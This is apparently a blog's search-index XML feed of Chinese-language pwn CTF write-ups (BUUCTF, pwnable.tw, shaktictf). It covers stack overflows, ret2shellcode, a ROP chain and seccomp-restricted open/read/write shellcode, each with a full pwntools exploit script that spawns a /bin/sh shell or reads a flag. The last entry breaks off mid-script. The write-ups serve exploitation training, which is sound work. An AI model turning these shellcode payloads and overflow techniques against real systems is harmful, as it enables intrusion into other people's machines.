<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>BUUCTF-ciscn_2019_s_9</title>
    <link href="/2025/07/27/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Shellcode/BUUCTF-ciscn-2019-s-9/"/>
    <url>/2025/07/27/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Shellcode/BUUCTF-ciscn-2019-s-9/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>BUUCTF上的一道ret2shellcode题目，链接在这：<a href="https://buuoj.cn/challenges#ciscn_2019_s_9">BUUCTF原题：ciscn_2019_s_9</a></p><span id="more"></span><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先还是拖到IDA，看到main调用了pwn函数：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Shellcode/BUUCTF-ciscn_2019_s_9/IDA-pwn.png"><br>进入pwn函数分析，如上图，因为距离返回地址偏移&#x3D;0x24&#x3D;36,而允许输入50个字符，因此存在溢出点<br><br>再看一下函数表，没找到明显的后门函数，因此考虑ret2shellcode或者ROP<br><br>之后checksec查看进一步确定方向：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Shellcode/BUUCTF-ciscn_2019_s_9/checksec.png"><br>可以看到保护全关，于是想到直接写shellcode即可<br></p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>劫持到shellcode，最关键的步骤是确定偏移和返回地址，偏移量在上面的讨论中已经确定，所以接下来只要确定返回地址即可<br><br>但是，由于开启了ASLR，不能直接把返回地址写死为栈上的某个地址，要想办法泄露地址或者让它自动跳转到shellcode<br><br>这里有一个小的做题经验：在IDA里如果看到hint函数，大概率程序中会有jmp esp这样的汇编指令，于是去反汇编的结果中搜索一下：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Shellcode/BUUCTF-ciscn_2019_s_9/jmp-esp.png"><br>顺利找到了跳转到esp的指令，因此可以无需泄露栈地址，通过esp控制执行流即可<br><br>最终的利用脚本如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>targetELF=<span class="hljs-string">&quot;./pwn&quot;</span><br><span class="hljs-comment">#ioTube=process(targetELF)</span><br><span class="hljs-comment">#ioTube=gdb.debug(targetELF,&quot;b *0x4006a4&quot;)</span><br>ioTube=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">29656</span>)<br>jmp_espAddr=<span class="hljs-number">0x8048554</span><br>boost=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">sub esp,40</span><br><span class="hljs-string">jmp esp</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>)<br>shellcode=<span class="hljs-string">b&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;</span><br>payload2=shellcode+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">15</span>+p32(jmp_espAddr)+boost<br>ioTube.recvuntil(<span class="hljs-string">&quot;&gt;\n&quot;</span>)<br>ioTube.sendline(payload2)<br>ioTube.recv()<br>ioTube.interactive()<br></code></pre></td></tr></table></figure><p>最后，还有一个值得注意的地方：<br><br>由于只能输入50个字节，在覆盖到返回地址后只剩下14个字节，肯定不够写shellcode，因此只能把shellcode放在缓冲区起始位置，因此在返回地址后面还需要一小段的引导代码（即脚本中的boost）<br><br>其实质上就是让esp指向shellcode，并再次jmp到esp</p>]]></content>
    
    
    <categories>
      
      <category>pwn刷题记录</category>
      
      <category>Shellcode</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>pwnable01-start</title>
    <link href="/2025/07/27/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Shellcode/pwnable01-start/"/>
    <url>/2025/07/27/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Shellcode/pwnable01-start/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>pwnable.tw上的第一题，原题链接在这：<a href="https://pwnable.tw/challenge/#1">pwnable.tw第1题：start</a><br></p><span id="more"></span><p>看题目名字猜测是一道基本的栈溢出劫持到shellcode，但是这道题对_start函数进行了处理，不能直接用IDA反编译，需要审计汇编代码<br></p><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先checksec分析程序开启了哪些保护：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Shellcode/pwnable01-start/checksec.png"><br>可以看到保护全关<br><br>接下来拖进IDA分析，如下图<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Shellcode/pwnable01-start/IDA.png"><br>发现甚至没有main函数，反编译也得不到什么信息，于是只能分析_start的汇编代码<br><br>分析之前先运行程序，结合动态行为降低阅读汇编代码的难度，如下图：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Shellcode/pwnable01-start/run.png"><br>可以看到程序仅存在一个输出和一个输入，并且从Segmentation Fault看出肯定有溢出点。<br><br>接下来以程序输出的”Let’s start the CTF:”作为线索去分析汇编代码<br><br>使用objdump，得到_start函数的反汇编代码如下：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Shellcode/pwnable01-start/disas.png"><br>主要观察到进行了两次系统调用，并且read允许最大读取60字节<br><br>这时再通过pwndbg的cyclic方法计算缓冲区到返回地址的偏移，具体方法见<a href="https://0x4a-210.github.io/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/Control-Hijack/">pwn.college题解：Control-Hijack</a><br><br>发现偏移&#x3D;20，因此可以溢出<br></p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>经过上述分析，利用方式为编写shellcode，将返回地址劫持到shellcode即可<br><br>但注意，由于从返回地址往后只剩下40个字节的机会，因此不能直接使用pwn库的shellcraft.sh()（会生成44字节的shellcode），需要自己编写shellcode<br><br>同时由于开启了ASLR，因此栈地址不再是确定的，需要想办法确定返回地址<br><br>观察到在_start的汇编代码中存在输出函数，因此想到泄露一个栈地址<br><br>再观察到汇编中存在直接把esp赋值给ecx的语句，故只要构建一个二阶段的利用方法，第一次返回到0x8048087，等待泄露出栈地址，再进行真正的溢出到shellcode即可<br><br>最终的利用脚本如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>targetELF=<span class="hljs-string">&quot;./start&quot;</span><br><span class="hljs-comment">#ioTube=process(targetELF)</span><br><span class="hljs-comment">#ioTube=gdb.debug(targetELF,&quot;b *0x804809c&quot;)</span><br>ioTube=remote(<span class="hljs-string">&quot;chall.pwnable.tw&quot;</span>,<span class="hljs-number">10000</span>)<br>offset=<span class="hljs-number">20</span><br>shellcode=<span class="hljs-string">b&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;</span><br>leakInstructAddr=<span class="hljs-number">0x8048087</span><br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*offset+p32(leakInstructAddr)<br>ioTube.recvuntil(<span class="hljs-string">&quot;Let&#x27;s start the CTF:&quot;</span>)<br>ioTube.send(payload1)<br>espLeakAddr=u32(ioTube.recv(<span class="hljs-number">4</span>))  <span class="hljs-comment">#返回地址+4的位置</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;esp point to &#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(espLeakAddr)))<br>returnAddr=espLeakAddr+<span class="hljs-number">20</span><br>payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">20</span>+p32(returnAddr)+shellcode<br>ioTube.send(payload2)<br>ioTube.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn刷题记录</category>
      
      <category>Shellcode</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF-picoctf_2018_rop_chain</title>
    <link href="/2025/07/26/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2text/BUUCTF-picoctf-2018-rop-chain/"/>
    <url>/2025/07/26/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2text/BUUCTF-picoctf-2018-rop-chain/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>BUUCTF上一道构造ROP链的题目，原题链接在这：<a href="https://buuoj.cn/challenges#picoctf_2018_rop%20chain">BUUCTF原题：PicoCTF_2018_rop_chain</a><br></p><span id="more"></span><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先还是拖进IDA反编译查看，发现溢出点在vuln函数：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2text/BUUCTF-picoctf-2018-rop-chain/IDA-vuln.png"><br>接下来checksec看一下，看到只开启了NX保护：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2text/BUUCTF-picoctf-2018-rop-chain/checksec.png"><br>考虑ROP，发现IDA的函数表一栏中存在两个win函数和一个flag函数，分别反编译分析源代码，如下图：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2text/BUUCTF-picoctf-2018-rop-chain/IDA-win_function1.png"><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2text/BUUCTF-picoctf-2018-rop-chain/IDA-win_function2.png"><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2text/BUUCTF-picoctf-2018-rop-chain/IDA-flag.png"><br>可以看到三个函数逻辑都很清晰，win1和win2是两个全局变量（双击可以在bss段看到它们的地址），flag会检查这两个变量以及自己的参数，满足要求即输出flag<br><br>所以，漏洞点即为通过溢出，构造ret链，分别调用这3个函数即可<br></p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>首先找偏移，可以直接在IDA里看出来offset&#x3D;0x18+0x4&#x3D;28<br><br>之后objdump反汇编，看到3个函数的地址，如图：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2text/BUUCTF-picoctf-2018-rop-chain/disas.png"><br>综上，利用脚本如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>targetELF=<span class="hljs-string">&quot;./pwn&quot;</span><br>elf=ELF(targetELF)<br><span class="hljs-comment"># ioTube=process(targetELF)</span><br><span class="hljs-comment">#ioTube=gdb.debug(targetELF,&quot;b *0x4006a4&quot;)</span><br>ioTube=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">27661</span>)<br>offset=<span class="hljs-number">28</span><br>retGadget=<span class="hljs-number">0x80483f6</span><br>win1Addr=<span class="hljs-number">0x80485cb</span><br>win2Addr=<span class="hljs-number">0x80485d8</span><br>flagAddr=<span class="hljs-number">0x804862b</span><br>win2Argc=-<span class="hljs-number">1163220307</span><br>flagArgc=-<span class="hljs-number">559039827</span><br>ioTube.recvuntil(<span class="hljs-string">&quot;Enter your input&gt; &quot;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*offset+p32(win1Addr)+p32(win2Addr)+p32(flagAddr)+p32(win2Argc,sign=<span class="hljs-literal">True</span>)+p32(flagArgc,sign=<span class="hljs-literal">True</span>)<br>ioTube.sendline(payload)<br>response=ioTube.recv().decode(errors=<span class="hljs-string">&quot;ignore&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag included in&#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(response))<br></code></pre></td></tr></table></figure><p>最后一个要注意的是对负数的打包，在pwn库中p系列函数默认是打包无符号数，因此要设置sign&#x3D;True</p>]]></content>
    
    
    <categories>
      
      <category>pwn刷题记录</category>
      
      <category>ROP</category>
      
      <category>ret2text</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>沙箱问题</title>
    <link href="/2025/07/26/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E6%B2%99%E7%AE%B1%E9%97%AE%E9%A2%98/"/>
    <url>/2025/07/26/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E6%B2%99%E7%AE%B1%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>之前从来没写过沙箱题，一下子遇到2道，直接懵了，记录一下<br></p><span id="more"></span><p>沙箱可以理解为一种虚拟环境，在CTF中，可以通过seccomp（Linux内核的一种特性）来实现系统调用的白名单和黑名单，从而限制程序使用某些系统调用，常见的限制为设置白名单，仅允许我们使用open、read和write<br><br>以两道题作为例子<br></p><h1 id="SeaShells"><a href="#SeaShells" class="headerlink" title="SeaShells"></a>SeaShells</h1><p>第一题是2025.07.26的shaktictf比赛里面的SeaShells题，原题链接在这：<a href="https://ctf.teamshakti.in/challenge/40">2025-07-26-shaktictf比赛原题：SeaShells</a><br></p><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>原文题目描述比较抽象，没什么有用信息，于是直接开始下载附件分析<br></p><h2 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h2><p>把ELF文件拖进IDA初步观察一下，如下图<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E6%B2%99%E7%AE%B1%E9%97%AE%E9%A2%98/SeaShells-IDA-main.png"><br>可以看到main函数逻辑很简单，是直接把我们输入的数据当作代码来执行<br><br>但是注意到左侧函数表中存在一个seccomp_initialisation的函数，想到这题应该加了沙箱，限制了我们的系统调用，大概率无法直接拿到shell<br><br>接着再对程序检查一下，使用seccomp-tools命令行工具，ubuntu22.04中安装命令如下：<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install gcc ruby-dev -y<br><span class="hljs-built_in">sudo</span> gem install seccomp-tools<br></code></pre></td></tr></table></figure><p>安装完成后使用该工具检查ELF文件：<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">seccomp-tools dump ./seashells<br></code></pre></td></tr></table></figure><p><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E6%B2%99%E7%AE%B1%E9%97%AE%E9%A2%98/seccomp-tools-check.png"><br>发现除了程序本身的系统调用，对于我们获取flag有用的只有open、read和write系统调用<br><br>由此，漏洞点清晰，需要编写一段仅使用了open、read和write系统调用的shellcode并输入即可<br></p><h2 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h2><p>file命令查看一下，发现是64位程序，因此编写出如下shellcode<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86_64&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>targetELF=<span class="hljs-string">&quot;./seashells&quot;</span><br><span class="hljs-comment"># ioTube=process(targetELF)</span><br>ioTube=remote(<span class="hljs-string">&quot;43.205.113.100&quot;</span>,<span class="hljs-number">8645</span>)<br>shellcode=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">.intel_syntax noprefix</span><br><span class="hljs-string">push 0</span><br><span class="hljs-string">mov r10,0x7478742e67616c66</span><br><span class="hljs-string">push r10</span><br><span class="hljs-string">lea rdi,[rsp]</span><br><span class="hljs-string">xor rsi,rsi</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">mov rax,2</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdi,rax</span><br><span class="hljs-string">sub rsp,100</span><br><span class="hljs-string">lea rsi,[rsp]</span><br><span class="hljs-string">xor rdx,rdx</span><br><span class="hljs-string">mov rdx,100</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">xor rdi,rdi</span><br><span class="hljs-string">mov rdi,1</span><br><span class="hljs-string">lea rsi,[rsp]</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">mov rax,1</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>ioTube.recvuntil(<span class="hljs-string">&quot;Give me the sea shells that you collected &gt;&gt;&quot;</span>)<br>ioTube.sendline(shellcode)<br>response=ioTube.recv().decode(errors=<span class="hljs-string">&quot;ignore&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag included in &#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(response))<br></code></pre></td></tr></table></figure><p>需要注意的有2点：<br><br>一是在远程中flag的文件路径需要猜测一下，一开始写的&#x2F;flag（即mov r10,67616c662f）没打通，后来改成flag.txt才打通<br><br>二是在open文件时，字符串的末尾一定要以0x00结尾（这也是为什么一开始有一条push 0指令）</p><h1 id="pwnable02-orw"><a href="#pwnable02-orw" class="headerlink" title="pwnable02-orw"></a>pwnable02-orw</h1><p>第二题是pwnable.tw上的一道题目，原题链接在这：<a href="https://pwnable.tw/challenge/#2">pwnable.tw第2题：orw</a><br></p><h2 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h2><p>这道题比上一题更简单，题目描述中给出了提示<br><br>直接告诉我们只有open、read和write可以使用，并且给出了flag的路径在&#x2F;home&#x2F;orw&#x2F;flag<br></p><h2 id="漏洞点分析-1"><a href="#漏洞点分析-1" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h2><p>下载附件后首先还是拖进IDA看一下<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E6%B2%99%E7%AE%B1%E9%97%AE%E9%A2%98/pwnable02-IDA-main.png"><br>发现逻辑就是直接执行shellcode，然后函数表里面还是有沙箱（orw_seccomp）<br><br>最后用file查看一下是32位文件<br><br>经过上述信息搜集，可以得到利用思路和上一题基本一致，只不过编写汇编语言时注意32位架构下的语法<br></p><h2 id="漏洞点利用-1"><a href="#漏洞点利用-1" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h2><p>直接编写出如下的利用脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> pwnlib.shellcraft<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>targetELF=<span class="hljs-string">&quot;./pwn&quot;</span><br><span class="hljs-comment"># ioTube=process(targetELF)</span><br>ioTube=remote(<span class="hljs-string">&quot;chall.pwnable.tw&quot;</span>,<span class="hljs-number">10001</span>)<br>shellcode=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">              push 0</span><br><span class="hljs-string">              push 0x67616c66</span><br><span class="hljs-string">              push 0x2f77726f</span><br><span class="hljs-string">              push 0x2f656d6f</span><br><span class="hljs-string">              push 0x682f2f2f</span><br><span class="hljs-string">              lea ebx,[esp]</span><br><span class="hljs-string"></span><br><span class="hljs-string">              xor ecx,ecx</span><br><span class="hljs-string">              xor edx,edx</span><br><span class="hljs-string">              </span><br><span class="hljs-string">              mov eax,5</span><br><span class="hljs-string">              int 0x80</span><br><span class="hljs-string"></span><br><span class="hljs-string">              </span><br><span class="hljs-string">              mov ebx,eax</span><br><span class="hljs-string">              mov edx,256</span><br><span class="hljs-string">              sub esp,256</span><br><span class="hljs-string">              lea ecx,[esp]</span><br><span class="hljs-string"></span><br><span class="hljs-string">              xor eax,eax</span><br><span class="hljs-string">              mov eax,3</span><br><span class="hljs-string">              int 0x80</span><br><span class="hljs-string"></span><br><span class="hljs-string">              xor ebx,ebx</span><br><span class="hljs-string">              mov ebx,1</span><br><span class="hljs-string">              mov edx,eax</span><br><span class="hljs-string">              lea ecx,[esp]</span><br><span class="hljs-string"></span><br><span class="hljs-string">              xor eax,eax</span><br><span class="hljs-string">              mov eax,4</span><br><span class="hljs-string">              int 0x80</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>ioTube.recvuntil(<span class="hljs-string">&quot;Give my your shellcode:&quot;</span>)<br>ioTube.sendline(shellcode)<br>response=ioTube.recv().decode(errors=<span class="hljs-string">&quot;ignore&quot;</span>)<br><span class="hljs-built_in">print</span>(response)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn刷题记录</category>
      
      <category>其他技巧类</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2025.07.26-shaktictf-Amogus</title>
    <link href="/2025/07/26/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/2025.07.26-shaktictf-Amogus/"/>
    <url>/2025/07/26/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/2025.07.26-shaktictf-Amogus/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>一道shaktictf比赛上的题目，链接在这<a href="https://ctf.teamshakti.in/challenge/41">7月26日shaktictf比赛：Amogus原题</a></p><span id="more"></span><p>原本的英文题目描述如下：<br><br>I always end up dying in this Amogus game… before I even get a chance to properly play! Ugh!<br><br>Is there any way I can escape this cruel fate?<br><br>大概意思就是目标二进制程序是模拟一个游戏，但是每次一开始就会死亡，需要我们找到办法正确启动游戏（避免死亡）<br></p><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>反正光看描述是云里雾里的，只能猜到应该是要绕过一个什么验证<br><br>于是直接把附件给的ELF拖到IDA里面看下：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/2025.07.26-shaktictf-Amogus/main.png"><br>首先如上图，在IDA里观察main函数调用了一个gameplay函数，联想到题目描述，导致“死亡”的元凶应该在这个gameplay里面，追踪进去看一下：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/2025.07.26-shaktictf-Amogus/gameplay.png"><br>分析这个函数可以发现，需要v4变量&#x3D;”ALIVE”才能获得flag，但是在校验之前v4有一个将”DEAD”拷贝给v4的操作，看起来似乎v4必定会&#x3D;“DEAD”<br><br>但是，注意到第11行的字符串拷贝语句，由于strcpy不会检查长度，而是遇到0字节停止，而恰好dest缓冲区在v4下方，而参数a1又是攻击者可控的，因此可以通过dest溢出将v4覆盖为”ALIVE”<br></p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>dest缓冲区16个字节，只需要填满dest缓冲区，再加上”ALIVE”，最后以0字节截断即可<br><br>由此构造的payload&#x3D;b’1’*16+b”ALIVE”+b’\x00’，最终的利用脚本如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86_64&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>targetELF=<span class="hljs-string">&quot;./pwn&quot;</span><br><span class="hljs-comment"># ioTube=process(targetELF)</span><br>ioTube=remote(<span 